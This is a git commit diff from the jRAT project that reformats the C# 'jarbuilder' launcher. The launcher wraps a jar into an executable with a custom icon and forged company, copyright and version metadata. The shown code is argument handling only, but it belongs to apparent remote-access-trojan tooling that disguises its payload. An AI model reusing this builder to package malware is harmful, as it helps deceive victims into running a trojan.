fa725e1aebed41597b5dc483d38480906238fcb1
redpois0n <git@redpois0n>
2015-02-24 16:41:12 +0100

    Cleanup, icon added

--- jarbuilder/Program.cs
+++ jarbuilder/Program.cs
@@ -1,5 +1,4 @@
-﻿// C# Project by BaussHacker
-using System;
+﻿using System;
 using System.Windows.Forms;
 
 namespace jRAT
@@ -16,34 +15,32 @@ namespace jRAT
 		private static void Main(string[] args)
 		{
 			Application.EnableVisualStyles();
-			//Application.SetCompatibleTextRenderingDefault(false);
-			//Application.Run(new MainForm());
 
-            if (args.Length == 11)
-            {
-                string input = args[0];
-                string filename = args[1];
-                string outputfile = System.Environment.GetFolderPath(System.Environment.SpecialFolder.ApplicationData) + "\\" + new Random().Next() + ".jar";
-                string iconfile = args[2];
-                string title = args[3];
-                string description = args[4];
-                string company = args[5];
-                string product = args[6];
-                string copyright = args[7];
-                string trademark = args[8];
-                string version = args[9];
-                string assemblyversion = args[10];
+			if (args.Length == 11)
+			{
+				string input = args[0];
+				string filename = args[1];
+				string outputfile = System.Environment.GetFolderPath(System.Environment.SpecialFolder.ApplicationData) + "\\" + new Random().Next() + ".jar";
+				string iconfile = args[2];
+				string title = args[3];
+				string description = args[4];
+				string company = args[5];
+				string product = args[6];
+				string copyright = args[7];
+				string trademark = args[8];
+				string version = args[9];
+				string assemblyversion = args[10];
 
-                CompileCode.GetJarCode(input);
-                CompileCode.AddArguments("-jar");
-                CompileCode.Compile(filename, outputfile, iconfile, title, description, company, product, copyright, trademark, version, assemblyversion);
+				CompileCode.GetJarCode(input);
+				CompileCode.AddArguments("-jar");
+				CompileCode.Compile(filename, outputfile, iconfile, title, description, company, product, copyright, trademark, version, assemblyversion);
 
-                MessageBox.Show("Compiled file " + args[1] + " from " + args[0], "jRAT", MessageBoxButtons.OK, MessageBoxIcon.Information);
-            }
-            else
-            {
-                MessageBox.Show("Invalid argument length: " + args.Length, "jRAT", MessageBoxButtons.OK, MessageBoxIcon.Error);
-            }
+				MessageBox.Show("Compiled file " + args[1] + " from " + args[0], "jRAT", MessageBoxButtons.OK, MessageBoxIcon.Information);
+			}
+			else
+			{
+				MessageBox.Show("Invalid argument length: " + args.Length, "jRAT", MessageBoxButtons.OK, MessageBoxIcon.Error);
+			}
 		}
 		
 	}
